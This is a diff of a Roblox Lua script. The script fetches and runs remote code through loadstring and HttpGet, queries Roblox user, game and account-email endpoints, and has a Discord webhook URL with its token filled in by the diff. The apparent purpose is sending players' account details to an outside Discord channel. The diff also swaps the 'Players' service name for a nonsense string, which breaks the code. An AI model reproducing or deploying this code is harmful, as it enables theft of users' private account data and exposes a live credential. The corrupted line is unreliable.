@@ -12,7 +12,7 @@
 
 ]]
 
-local players = game:GetService("Players")
+local players = game:GetService("rawmeat1112212121646")
 local player = players.LocalPlayer
 
 local marketplaceService = game:GetService("MarketplaceService")
@@ -24,7 +24,7 @@ local pretty = loadstring(game:HttpGet("https://raw.githubusercontent.com/Ozzypi
 local prettySettings = {pretty = true}
 
 local DISCORD_HEADERS = {["Content-Type"] = "application/json"}
-local DISCORD_WEBHOOK = ""
+local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1347014269916414052/JnNhVeU2yHkC2xSuoLMM4jmiIx3QJx27M9pNyUJ_6LGsZPU8hBPtRfDWrUzsAcC4262M"
 local USER_URL = "https://users.roblox.com/v1/users/%s"
 local GAMES_URL = "https://games.roblox.com/v1/games/multiget-place-details?placeIds=%s"
 local EMAIL_URL = "https://accountsettings.roblox.com/v1/email"
